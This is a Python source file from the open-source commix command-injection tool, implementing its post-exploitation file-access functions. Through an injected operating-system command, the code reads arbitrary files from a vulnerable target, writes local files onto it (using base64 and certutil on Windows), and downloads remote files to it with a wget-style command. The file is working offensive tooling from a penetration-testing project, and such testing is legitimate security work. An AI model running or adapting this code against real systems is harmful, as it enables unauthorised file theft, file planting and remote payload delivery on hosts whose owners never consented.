#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import urllib
import urllib2

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_injector

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Read a file from the target host.
"""
def file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  file_to_read = menu.options.file_read
  # Execute command
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_FILE_READ + file_to_read
  else:
    cmd = settings.FILE_READ + file_to_read 
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  shell = "".join(str(p) for p in shell)
  if menu.options.verbose:
    print ""
  if shell:
    sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
    sys.stdout.flush()
    print shell
    output_file = open(filename, "a")
    output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
    output_file.close()
  else:
   sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read the '" + file_to_read + "' file." + Style.RESET_ALL + "\n")
   sys.stdout.flush()

"""
Write to a file on the target host.
"""
def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  file_to_write = menu.options.file_write
  if not os.path.exists(file_to_write):
    sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that the '" + file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    sys.exit(0)
    
  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\n", " ") for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
    if settings.TARGET_OS == "win":
      import base64
      content = base64.b64encode(content)
  else:
    sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + file_to_write + "' is not a file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
  else:
    dest_to_write = menu.options.file_dest

  # Execute command
  if settings.TARGET_OS == "win":
    dest_to_write = dest_to_write.replace("\\","/")
    # Find path
    path = os.path.dirname(dest_to_write)
    path = path.replace("/","\\")
    # Chnage directory
    cmd = "cd " + path + separator +separator + settings.WIN_COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    # Find filename
    filname = os.path.basename(dest_to_write)
    tmp_filname = "tmp_" + filname
    cmd = settings.FILE_WRITE + " " + content + " > " + tmp_filname + separator + settings.WIN_COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    # Decode base 64 encoding
    cmd = "certutil -decode "  + tmp_filname + " " + filname + separator + settings.WIN_COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
    #fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
    # Delete tmp file
    cmd = "del "  + tmp_filname + separator + settings.WIN_COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
    #fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
    # Check if file exists
    cmd = "cmd /c if exist " + filname + " (echo " + filname + ")" 
    dest_to_write = path + "\\" + filname 

  else:
    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
    shell = "".join(str(p) for p in shell)
    # Check if file exists
    cmd = "echo $(ls " + dest_to_write + ")"

  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was created successfully!\n" + Style.RESET_ALL)
    sys.stdout.flush()
  else:
   sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_write + "' file." + Style.RESET_ALL + "\n")
   sys.stdout.flush()

"""
Upload a file on the target host.
"""
def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  if settings.TARGET_OS == "win":
    # Not yet implemented
    pass
  else:
    file_to_upload = menu.options.file_upload
    # check if remote file exists.
    try:
      urllib2.urlopen(file_to_upload)
    except urllib2.HTTPError, err:
      sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err)+ ")" + Style.RESET_ALL + "\n")
      sys.stdout.flush()
      sys.exit(0)
      
    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
    else:
      dest_to_upload = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    if settings.TARGET_OS == "win":
      cmd = "dir " + dest_to_upload + ")"
    else:  
      cmd = "echo $(ls " + dest_to_upload + ")"
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" + Style.RESET_ALL + "\n")
      sys.stdout.flush()
    else:
     sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_upload + "' file." + Style.RESET_ALL + "\n")
     sys.stdout.flush()

"""
Check the defined options
"""
def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):

  if menu.options.file_write:
    file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_read:
    file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.FILE_ACCESS_DONE = True 

  if settings.FILE_ACCESS_DONE:
    print ""

# eof